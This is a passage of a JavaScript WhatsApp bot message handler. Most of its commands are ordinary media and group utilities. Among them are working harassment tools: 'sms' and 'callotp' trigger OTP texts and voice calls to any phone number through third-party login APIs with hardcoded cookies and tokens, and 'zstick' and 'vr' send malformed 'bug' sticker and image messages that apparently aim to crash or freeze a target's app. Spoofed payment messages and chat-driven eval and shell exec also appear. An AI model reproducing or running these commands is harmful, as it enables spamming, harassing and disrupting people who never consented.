	let getdog = (await func.fetchJson("https://random.dog/woof.json"))
	m.reply(getdog.url, { caption: func.formatSize(getdog.fileSizeBytes), quoted: wDog })
	db.users[m.sender].limit -= 1
} // (?); random media-dog
break
            
case "edit": {
	if (!m.isQuoted) return m.reply('invalid quoted')
	if (!m.quoted.sender.match((await alpha.decodeJid(alpha.user?.id)))) return m.reply('invalid message')
	alpha.sendMessage(m.from, { text: m.text ? m.text : 'editedMessage', edit: m.quoted.key })
}
break

case 'url':
if (m.args[0] === 'yt') {
	let gexUrlyt = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
	if (!gexUrlyt) return m.reply('youtube url not found.')
	let gexUrlytt = 'YouTube url: total-'+gexUrlyt.length
	let gexNyurl = 1
	for (let ytallUrl of gexUrlyt) {
		gexUrlytt += `\n\n${gexNyurl++}. ${ytallUrl}`
	} // (?); get url-youtube 
	m.reply(gexUrlytt.trim())
} else {
	let urls = quoted.text.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
	if (!urls) return m.reply('url not found')
	let urlTeks = `Detected url: total-${urls.length};`
	let urlNo = 1
	for (let i of urls) {
		urlTeks += `\n\n${urlNo++}. ${i}`
	}
	m.reply(urlTeks.trim())
} // (?); get url-all
break

case "setpp": case "setprofile": case "seticon": {
	if (m.isGroup) {
		if (!(m.isAdmins || m.isOwner)) return m.reply("admin only")
		if (!m.isBotAdmin) return m.reply("im not admin")
		if (!/image/i.test(quoted.mime)) return m.reply("invalid method")
		let mediz = await alpha.downloadMediaMessage(quoted, 'ppicture.jpeg')
		if (m.args[0] == "full") {
			let jread = await jimp.read(mediz)
			let resz = jread.getWidth() > jread.getHeight() ? jread.resize(550, jimp.AUTO) : jread.resize(jimp.AUTO, 650)
			await alpha.query({
				tag: 'iq',
				attrs: {
					to: m.from,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [{
					tag: 'picture',
					attrs: {
						type: 'image'
					},
					content: await resz.getBufferAsync(jimp.MIME_JPEG)
				}]
			})
			fs.unlinkSync(mediz)
			m.reply("200_")
		} else {
			await alpha.updateProfilePicture(m.from, { url: mediz })
			fs.unlinkSync(mediz)
			m.reply("200_")
		}
	} else if (!m.isGroup) {
		if (!(m.isOwner || m.isMe)) return m.reply("owner only")
	}
}
break


case "listgrup": case "grouplist": {
	if (!m.isOwner) return m.reply('not_owner')
	let getGroups = await alpha.groupFetchAllParticipating()
	let gclish = Object.entries(getGroups).slice(0).map((entry) => entry[1])
	let gclist = gclish.map(v => v.id)
	let gctext = `Daftar Chat Grup - (total: ${gclist.length});`
	for (let a of gclist) {
		let mdata = await alpha.groupMetadata(a)
		gctext += `\n\n${mdata.participants.length} ) *${mdata.subject}*\n${mdata.id}`
	} // (?); daftar chat grup
	m.reply(gctext.toString())
}
break

case "hidetag": case "tg": {
    if (!m.isGroup) return m.reply("group")
    if (!(m.isAdmin || m.isOwner)) return m.reply("admin")
    let mentions = m.metadata.participants.map(a => a.id)
    let mod = await alpha.cMod(m.from, quoted, /hidetag|tag|ht|h|totag/i.test(quoted.body) ? quoted.body.replace(m.prefix + command, "") : quoted.body)
    alpha.sendMessage(m.from, { forward: mod, mentions })
}
break

case "add": {
	if (!m.isGroup) return m.reply("group")
	if (!m.isAdmin) return m.reply("admin")
	if (!m.isBotAdmin) return m.reply("botAdmin")
	let users = m.mentions.length !== 0 ? m.mentions.slice(0, 2) : m.isQuoted ? [m.quoted.sender] : m.text.split(",").map(v => v.replace(/[^0-9]/g, '') + "@s.whatsapp.net").slice(0, 2)
	if (users.length == 0) return m.reply("invalid method")
	await alpha.groupParticipantsUpdate(m.from, users, "add")
	.then((res) => {
		for (let i of res) {
			if (i.status == 403) return m.reply(`Unable to add @${i.jid.split`@`[0]}, may be privacy`)
			else if (i.status == 409) return m.reply(`@${i.jid?.split('@')[0]} already in this group`)
			else m.reply(func.format(i))
		}
	})
}
break



case "git": case "gitclone": try {
if (!m.args[0]) return m.reply('input_url')
if (!func.isUrl(m.args[0]) && !m.args[0].includes('github.com')) return m.reply(`Link invalid!!`)
	
    let [, user, repo] = m.args[0].match(/(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await func.fetchJson(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    alpha.sendMessage(m.from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m })
} catch (err) {
	m.reply(String(err))
} // (?); git clone
break

case "yty": {
	if (!m.text) return "url?"
	axios.post("https://snapvid.io/wp-json/aio-dl/video-data", { 
		url: m.text
	}).then(res => {
		fs.writeFileSync("./"+res.data.title+".json", func.Format(res))
		m.reply(fs.readFileSync("./"+res.data.title+".json"), { mimetype: "application/json", fileName: res.data.title+".json", quoted: m })
		alpha.sendMessage(m.chat, {
	document: fs.readFileSync('./'+ytdlFile),
	mimetype: 'text/javascript',
	fileName: ytdlFile,
	caption: `${getYtdl.videoDetails.title}\n${String.fromCharCode(8206).repeat(800)}\n${getYtdl.videoDetails.description}\n\nthumbnails: `+jsonformat(getYtdl.videoDetails.thumbnails)
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(ytdlFile)
	})
}
break

case "tt": {
    if (!/https?:\/\/(www\.|v(t|m|vt)\.|t\.)?tiktok\.com/i.test(m.text)) return m.reply("invalid url")
    let req = await func.fetchJson("https://xzn.wtf/api/tiktok?url="+m.text+"&apikey=qwerty404")
    m.reply(func.Format(req.data))
}
break

case "tiktok": {
    if (!/https?:\/\/(www\.|v(t|m|vt)\.|t\.)?tiktok\.com/i.test(m.text)) return m.reply("invalid url")
    await m.reply("wait")
    let req = await func.fetchJson("https://xzn.wtf/api/tiktok?url="+m.text+"&apikey=qwerty404")
    if (req.code !== 0) return m.reply(req.msg)
    if (req.data?.images) {
        if (req.code !== 0) return m.reply(req?.msg || "error")
        for (let url of req.data.images) {
            m.reply(url)
            await func.sleep(5000)
        }
    } else m.reply(req.data.play, { caption: func.Format(req.data) })
}
break

case 'tiktok2': try {
	let xTiktok = quoted.text.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
	if (!xTiktok) return m.reply("invalid url")
	m.reply("wait")
	let skdn = await func.fetchJson('https://tr.deployers.repl.co/tiktok?url='+xTiktok[0])
	const regex = /\.\/(.*?)\.mp4/;
	const result = skdn.match(regex);
	m.reply("https://tr.deployers.repl.co/"+result[1]+".mp4")
} catch (err) {
	console.log(err)
	m.reply("404")
}
break

case "pinterest": {
        const gettoken = await axios.get('https://viddownloader.online/pinterest-downloader/')
        const token = require("cheerio").load(gettoken.data)('#token').attr('value')
        const options = {
            method: 'POST',
            url: 'https://viddownloader.online/wp-json/aio-dl/video-data/',
            headers: {
                "content-type": 'application/json; charset=UTF-8',
                "cookie": 'PHPSESSID=pboq0ag9iikl5fd1ahf1cchs93;'
            },
            formData: {
                url: `${m.text}`,
                token: token
            }
        }
        request(options, async function(error, response, body) {
            if (error) return m.reply({ status: false })
            
            m.reply(func.Format(body))
        })
        // m.reply(func.Format(options))
}
break

case "pin": {
  const gettoken = await axios.get('https://viddownloader.online/pinterest-downloader/');
  const $ = require("cheerio").load(gettoken.data);
  const token = $('#token').attr('value');
  
  const form = new FormData();
  form.append('url', `${m.text}`);
  form.append('token', token);
  
  const options = {
    method: 'POST',
    url: 'https://viddownloader.online/wp-json/aio-dl/video-data/',
    headers: {
      "content-type": 'multipart/form-data',
      "cookie": 'PHPSESSID=pboq0ag9iikl5fd1ahf1cchs93;'
    },
    data: form
  };
  
  request(options, async function(error, response, body) {
    if (error) return m.reply({ status: false });
    
    m.reply(func.Format(body));
  });
}
break;

case "ssweb": {
	if (!func.isUrl(m.args[0])) return m.reply('invalid url')
	await m.reply("wait")
	m.reply("https://api.popcat.xyz/screenshot?url="+m.text)
}
break

case "ts": {
	if (!m.isQuoted) return
	m.reply("https://vihangayt.me/maker/text2sound?q="+m.quoted.body+"&lang=id")
}
break

case "ai": case "gpt": {
	if (db.users[m.sender].limit < 1) return m.reply("limit_expired")
	if (!m.text) throw `no query found`
	await m.reply("wait a minute..")
	console.log('ai; '+m.sender.split('@')[0])
	const { delay } = require('@whiskeysockets/baileys')
	const sessions = {}
	if (!(m.sender in sessions)) sessions[m.sender] = [{ role: 'system', content: `Nama mu adalah Alpha, sekarang pukul ${new Date().toLocaleString('id', { timeZone: 'Asia/Jakarta' })}, jawab pertanyaan apapun yang ditanyakan kepadamu` }]
	let session = sessions[m.sender]
	session.push({ role: 'user', content: m.text })
	const response = await axios.post('https://xzn.wtf/api/openai?apikey=qwerty404', { messages: session })
	if (!response || response.status !== 200) throw response.statusText || 'Error'
	const { data: { err, result } } = response
	if (err) throw err
	await m.reply(result)
	db.users[m.sender].limit -= 1
	session.push({ role: 'assistant', content: result })
	await delay(5 * 60 * 1000)
	delete sessions[m.sender]
}
break

case "dsend": {
	if (!quoted) return m.reply('imvalid_msg')
	let dtsMedia = quoted.text.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
	if (!dtsMedia) return m.reply('no_such_url')
	let dtsMedext = Number(m.text) ? Number(m.text) : 1
	m.reply(dtsMedia[Math.floor(dtsMedext - 1)]).catch(e => {
		m.reply(format(e))
	})
}
break

/* 
case 'searchtext': case 'stext':
if (!m.text) return m.reply('input_text')
fs.readFile('./event/message.js', 'utf8', (err, data) => {
	let shCase = data.split('\n');
	let getLinec = shCase.findIndex(line => line.includes(m.text));
	if (getLinec >= 0 && getLinec < shCase.length && getLinec !== -1) {
	  m.reply(`text found! line-${getLinec + 1};\n\n${shCase[getLinec]}`);
	} else {
	  m.reply(mess.error.found);
	}
})
break
*/

case 'searchtext':
case 'stext':
if (!m.text) return m.reply('input_text');
fs.readFile('./event/message.js', 'utf8', (err, data) => {
    if (err) {
        return m.reply('Error reading the file');
    }

    let shCase = data.split('\n');
    let foundLines = [];

    shCase.forEach((line, index) => {
        if (line.includes(m.text)) {
            foundLines.push(`*Line-${index + 1};* ${line}\n`);
        }
    });

    if (foundLines.length > 0) {
        m.reply(`Text "${m.text}" found!\n\n${foundLines.join('\n')}`.trim());
    } else {
        m.reply('Text not found in any line.');
    }
});
break;
    

case "swin": {
	if (!m.isOwner) return m.reply("404_")
	alpha.sendMessage("status@broadcast", {
		audio: await quoted.download(),
		mimetype: "audio/mp4"
	}, {
		backgroundColor: "#333333",
		statusJidList: m.metadata.participants.map(v => v.id)
	})
}
break


case "dv": {
	const fpoll = {
    key: {
      participant: "0@s.whatsapp.net",
      remoteJid: m.from
    },
    message: {
      pollCreationMessage: {
        name: "test"
      }
    }
  }


const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'testt',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'testttt'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const qoncvid = { // Quoted ViewOnce Video (default)
key: { participant: '0@s.whatsapp.net' }, 
	message: { videoMessage: { 
	viewOnce: true }
	}
}

const qinv = { // Quoted Group Invite (default)
key: { participant: '0@s.whatsapp.net',
remoteJid: '0@s.whatsapp.net' },
	message: { groupInviteMessage: {
	groupJid: "6285822934204-1629902804@g.us",
	inviteCode: "EA28xnkjJAI0PNANNXqWN8",
	caption: "testt" }
	}
}

const qloc = { // Quoted Location (default)
key : { participant : '0@s.whatsapp.net', remoteJid: "6289643739077-1613049930@g.us"},
	message: { liveLocationMessage: {
	caption: "testt" }
	}
}
	m.reply("testt", { quoted: qloc })
}
break

case "fw": {
	const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false, id: 'testt',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "MYR",amount1000: 404000,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: "Alpha's Project"}},expiryTimestamp: 404000,amount: {value: 91929291929,offset: 1000,currencyCode: "MYR"}}}}
	alpha.sendMessage(m.from, {
		text: "test", contextInfo: {
			forwardingScore: 256, isForwarded: true
		}
	}, {
		ephemeralExpiration: 86400,
		quoted: frpayment
	})
}
break

case "tess": {
	alpha.sendMessage(m.from, { text: 'testt' }, { 
		quoted: { 
			key: {
				fromMe: [], 
				participant: "0@s.whatsapp.net", ...(m.from ? { remoteJid: "" } : {}) 
			},
			message: {
				stickerMessage: {
					url: "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
					fileSha256: "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
					fileEncSha256: "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
					mediaKey: "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
					mimetype: "image/webp",
					height: 40,
					width: 40,
					directPath: "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
					fileLength: "99999999",
					mediaKeyTimestamp: "16572901099967",
					isAnimated: []
				}
			}
		}
	})
}
break

case 'vr': {
if (!m.isOwner) return m.reply('__')
m.reply("wait")
var document = require('@whiskeysockets/baileys').generateWAMessageFromContent(m.from, require('@whiskeysockets/baileys').proto.Message.fromObject({
	"imageMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572&mms3=true",
					"mimetype": "image/jpeg",					
					"fileSha256": "TwxGIa1qFIDW39pvaGPl99aFqWf9xrJFMcDT16vT7U4=",
					"fileLength": "9565843",
					"height": 39993,
					"width": 1080,
					"mediaKey": "nnJ5XWdm409Z5qVLxUJUuVRUAUuNF44Gx5bsiCkrFEY=",
					"fileEncSha256": "OTCC5XCCa8rZMTD/ou8Q86dB3Vglqpx5bN0M8hCksCw=",
					"directPath": "/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572",
					"mediaKeyTimestamp": "1690265380",
					"jpegThumbnail": null,
					"scansSidecar": "/ZCEGb8p+SVtjE0eAKtM9SZyjz9cm9Utxmy/Zuvb8BbbG1V76XsTFA==",
					"scanLengths": [
						687102,
						6152788,
						1292833,
						1433120
					],
					"midQualityFileSha256": "R1EivePk56jyqH4iEQOfNOrKCiEfQCO9JYqtCwAdX4o="
				}

}), { userJid: m.from, quoted: m })
alpha.relayMessage(m.from, document.message, { messageId: document.key.id })
}
break


case "sms": {
	if (!m.isOwner) return m.reply('owner')
	m.reply("wait")
	const froms = m.quoted ? m.quoted.sender : m.text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	let nosms = '+' + froms.replace('@s.whatsapp.net', '')
	let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
	let ua = mal[Math.floor(Math.random() * mal.length)];
	

axios.post('https://api.myfave.com/api/fave/v1/auth', {
	phone: nosms
}, {
	headers: {
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
	}
}).then(res => {
	m.reply(format(res));
})
	
}
break


case "gt": case "callotp": try {
	if (!m.isOwner) return m.reply('owner_only')
	let callSend = m.quoted ? m.quoted.sender.split('@')[0] : m.text.replace(/[^0-9]/g, '')
	if (!callSend) return m.reply('invalid_number') 
	if (!callSend.startsWith('62')) return m.reply('invalid_number')
	axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests', {
		'phone_number': '+'+callSend,
		'channel': 'voice'},{
		headers: {
			'authority': 'magneto.api.halodoc.com',
			'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
			'cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D',
			'origin': 'https://www.halodoc.com',
			'sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
			'x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'
		}
	}).then((res) => m.reply(`${func.Format(res.data)}\n\nNumb; ${callSend}`))
} catch (err) {
	m.reply(err)
}
break

case 'getcase': case 'case':
    if (!m.isOwner) return m.reply('not_owner');
    if (!m.text) return m.reply('Tambahkan nama Case yang tersedia di ');
    let getCase = (text) => {
        let fileContent = fs.readFileSync("./event/message.js", "utf8").toString();
        let caseContent = fileContent.split(`case "${text}"`)[1].split("break")[0];
        return "case " + `"${text}"` + caseContent + "break";
    };
m.reply(getCase(m.text))
break

case "carbon": {
	carbon(m.text, "./hello.png").then(res => {
		m.reply(format(res))
	})
	// m.reply("https://api.xfarr.com/api/converted/carbon?apikey="+config.settings.apikey+"&query="+m.text)
}
break

case "ppt": {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  const url = 'https://carbon.now.sh/';
  
  // Kunjungi halaman web
  await page.goto(url);

  // Tunggu sebentar agar halaman selesai dimuat (Anda bisa menyesuaikan waktu yang diperlukan)
  await page.waitForTimeout(3000);

  // Ambil screenshot dari halaman web
  const screenshot = await page.screenshot();

  // Simpan screenshot ke sistem file Anda
  const outputPath = 'screenshot.png'; // Gantilah dengan nama file dan lokasi yang Anda inginkan
  fs.writeFileSync(outputPath, screenshot);

  m.reply(`Screenshot telah disimpan di ${outputPath}`);

  await browser.close();
}
break


case 'toviewonce': case "toonce": {
	if (!/image|video/i.test(quoted.mime)) return
	m.reply(await quoted.download(), { fileLength: "8500000000", viewOnce: true }, { quoted: m })
}
break

case "zstick": {
let fromzs = m.text ? m.text : m.from
	let stickBug = require('@whiskeysockets/baileys').generateWAMessageFromContent(fromzs, require('@whiskeysockets/baileys').proto.Message.fromObject({
		"stickerMessage": {
							"url": "https://mmg.whatsapp.net/d/f/Ar3J73JZWDkALd78sCqG3MhOl8e5O4mLrCB_c83IrW2z.enc",
							"fileSha256": "k1MG4Nx8T0C1H8PBwT7Me9yEhjHksd8tdSl6H6N/TF0=",
							"fileEncSha256": "GEyPQzx5ejVaConK5p5Bm+g/gBULXrSTgjAaFriudfI=",
							"mediaKey": "RalS1uKVh3ysv5aMCDHMqJ9osXF4O3ORlCdn9HsF5xY=",
							"mimetype": "image/webp",
							"sendEphemeral": true,
						    "thumbnail": null,
							"directPath": "/v/t62.15575-24/12155350_3800086346757642_2527437135372892402_n.enc?ccb=11-4&oh=22c0ea4d51336ce9774713b472e40d90&oe=616F20BC",
							"fileLength": "8500000000000",
							"mediaKeyTimestamp": "1632135185",
							"isAnimated": false
	}
	}), { userJid: m.sender, quoted: null })
	alpha.relayMessage(fromzs, stickBug.message, { messageId: stickBug.key.id})
}
break

case "wait":
if (!(m.isOwner || m.isMe)) return
var load = [
  "|▒▒▒▒▒▒▒▒▒▒| 1%",
  "|█▒▒▒▒▒▒▒▒▒| 5%",
  "|██▒▒▒▒▒▒▒▒| 10%",
  "|██▒▒▒▒▒▒▒▒| 15%",
  "|██▒▒▒▒▒▒▒▒| 20%",
  "|███▒▒▒▒▒▒▒| 25%",
  "|███▒▒▒▒▒▒▒| 30%",
  "|████▒▒▒▒▒▒| 35%",
  "|████▒▒▒▒▒▒| 40%",
  "|█████▒▒▒▒▒| 45%",
  "|█████▒▒▒▒▒| 50%",
  "|██████▒▒▒▒| 55%",
  "|██████▒▒▒▒| 60%",
  "|███████▒▒▒| 65%",
  "|███████▒▒▒| 66%",
  "|███████▒▒▒| 67%",
  "|███████▒▒▒| 68%",
  "|███████▒▒▒| 69%",
  "|███████▒▒▒| 70%",
  "|████████▒▒| 71%",
  "|████████▒▒| 72%",
  "|████████▒▒| 73%",
  "|████████▒▒| 74%",
  "|████████▒▒| 75%",
  "|████████▒▒| 76%",
  "|████████▒▒| 77%",
  "|████████▒▒| 78%",
  "|████████▒▒| 79%",
  "|████████▒▒| 80%",
  "|█████████▒| 81%",
  "|█████████▒| 82%",
  "|█████████▒| 83%",
  "|█████████▒| 84%",
  "|█████████▒| 85%",
  "|█████████▒| 86%",
  "|█████████▒| 87%",
  "|█████████▒| 88%",
  "|█████████▒| 89%",
  "|█████████▒| 90%",
  "|██████████| 91%",
  "|██████████| 92%",
  "|██████████| 93%",
  "|██████████| 94%",
  "|██████████| 95%",
  "|██████████| 96%",
  "|██████████| 97%",
  "|██████████| 98%",
  "|██████████| 99%",
  "|██████████| 100%",
  "Success!"
];


  let key = await alpha.sendMessage(m.from, {text: "Wait a minute!"}, {quoted: m})
  for (let i = 0; i < load.length; i++) {
    await new Promise(resolve =>
    setTimeout(resolve, 500));
    
    await alpha.sendMessage(m.from,
    {text: load[i], edit: key.key }, {quoted: m});
   }
break


case "loc": {
	alpha.relayMessage(m.from, { liveLocationMessage: { 
	degreesLatitude: 35.676570,
	degreesLongitude: 139.762148,
	caption : 'test',
	sequenceNumber: 1656662972682001, timeOffset: 998600, jpegThumbnail: null,
	contextInfo: {
	mentionedJid: [m.sender],
	externalAdReply: {
	containsAutoReply: true,
	showAdAttribution: false,
	}
	}
	}
	}, {quoted: m})
}
break

case "id": case "getid": {
	m.reply(m.from);
}
break


case "pixel": {
	if (!/image/i.test(quoted.mime)) return m.reply("invalid media")
	let txLevixel = Number(m.args[0]) ? Number(m.args[0]) : 10
	await m.reply("wait a minute..")
	let gPixee = await jimp.read(await quoted.download());
	let rPixee = await gPixee.pixelate(txLevixel).getBufferAsync(jimp.MIME_PNG)
	m.reply(rPixee)
}
break


	// advanved?.features - project
	
	case "react": case "reaction": {
		let reactMoji = m.args[0] ? m.args[0] : "👍"
		if (m.isQuoted) {
			alpha.sendMessage(m.from, {
				react: {
					text: reactMoji,
					key: m.quoted.key
				}
			})
		} else if (!m.isQuoted) {
			alpha.sendMessage(m.from, {
				react: {
					text: reactMoji,
					key: m.key
				}
			})
		}
	}
	break
	
	case "gcall": {
		alpha.relayMessage(m.from, {
			scheduledCallCreationMessage: {
			callType: "AUDIO",
			scheduledTimestampMs: 999999,
			title: m.text ? m.text : "test"
			} // (?); group call
		}, {})
	}
	break
	
	case "zpay": {
		let payId = m.text.split('|')[1] ? m.text.split('|')[1] : m.from
		let payTxt = m.text.split('|')[0] ? m.text.split('|')[0] : "requestPaymentMessage"
		let requestPaymentMessage = require('@whiskeysockets/baileys').generateWAMessageFromContent(payId, require('@whiskeysockets/baileys').proto.Message.fromObject({
			requestPaymentMessage: {
				currencyCodeIso4217: "IDR",
				requestFrom: m.sender, // "6281111111111@s.whatsapp.net",
				amount1000: "2000000",
				noteMessage: {
					extendedTextMessage: {
						text: payTxt
					}
				}
			}
		}), { userJid: m.chat })
		alpha.relayMessage(payId, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
	} // (?); requestPaymentMessage
	break
	
	case "zptv": {
		if (!/video|image/i.test(quoted.mime)) return m.reply("invalid media")
		if (!m.quoted.seconds > 30) return reply('30s-max duration')
		let idptv = m.text ? m.text : m.from
		let msg = await require('@whiskeysockets/baileys').generateWAMessageContent({
			video: await m.quoted.download()
		}, {
			upload: alpha.waUploadToServer
		}) // (?); circle video ptvMessage 
		await alpha.relayMessage(idptv, {
			ptvMessage: msg.videoMessage
		}, {})
	}
	break



            default:
                if ([">", "eval", "=>", "≥"].some(a => m.body?.toLowerCase()?.startsWith(a))) {
                    if (!m.isOwner) return
                    let evalCmd = ""
                    try {
                        evalCmd = /await/i.test(m.text) ? eval("(async() => { " + m.text + " })()") : eval(m.text)
                    } catch (e) {
                        evalCmd = e
                    }
                    new Promise(async (resolve, reject) => {
                        try {
                            resolve(evalCmd);
                        } catch (err) {
                            reject(err)
                        }
                    })
                        ?.then((res) => m.reply(format(res)))
                        ?.catch((err) => m.reply(format(err)))
                }

                if (["$", "exec"].some(a => m.body?.toLowerCase()?.startsWith(a))) {
                    if (!m.isOwner) return
                    try {
                        exec(m.text, async (err, stdout) => {
                            if (err) return m.reply(func.format(err))
                            if (stdout) return m.reply(func.format(stdout))
                        })
                    } catch (e) {
                        m.reply(func.format(e))
                    }
                }


if (/^tes(t)?/i.test(m.body)) {
	m.reply("active_")
}
        }
    } catch (e) {
    	console.log(e)
        m.reply(e, { from: config.options.owner[0]+"@s.whatsapp.net" })
    }
}
